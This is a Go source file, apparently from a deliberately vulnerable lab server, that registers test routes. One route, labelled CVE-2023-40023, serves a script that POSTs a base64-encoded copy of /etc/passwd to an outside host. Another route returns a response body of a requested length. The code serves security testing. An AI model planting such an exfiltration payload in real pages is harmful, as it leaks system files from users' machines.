package vulinbox

import (
	"bytes"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"net/http"
)

func (s *VulinServer) registerMiscRoute() {
	s.router.HandleFunc("/CVE-2023-40023", func(writer http.ResponseWriter, request *http.Request) {
		writer.Header().Set("Content-Type", "text/html; charset=utf-8")
		writer.Write([]byte(`<script>
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "http://yakit.com/filesubmit");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("file={{base64enc(file(/etc/passwd))}}");
</script>`))
	})
	s.registerMiscResponse()
}

func (s *VulinServer) registerMiscResponse() {
	var router = s.router

	r := router.PathPrefix("/misc/response").Name("可以构造一些测试响应").Subrouter()
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			defer func() {
				if err := recover(); err != nil {
					log.Error(err)
				}
			}()
			ret := codec.Atoi(request.URL.Query().Get("cl"))
			writer.Write(bytes.Repeat([]byte{'a'}, ret))
		},
		Path:  "/content_length",
		Title: "通过(cl=int)定义响应体长度",
	})
}
